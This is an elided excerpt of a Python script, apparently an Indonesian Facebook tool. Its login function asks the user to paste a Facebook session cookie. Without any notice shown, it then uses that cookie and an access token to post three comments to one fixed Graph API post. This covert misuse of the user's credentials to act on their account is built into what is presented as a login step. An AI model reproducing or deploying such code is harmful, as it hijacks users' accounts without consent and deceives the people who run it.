...
def login_lagi334():
    try:
        ...
        cokimy = console.input(f" {H2}• {P2}Masukan Cookie : ")
        cookies = {'cookie':cokimy}
        ...
        requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom4}&access_token={tok1}", headers = {"cookie":cokimy})
        requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom3}&access_token={tok1}", headers = {"cookie":cokimy})
        requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom6}&access_token={tok1}", headers = {"cookie":cokimy})
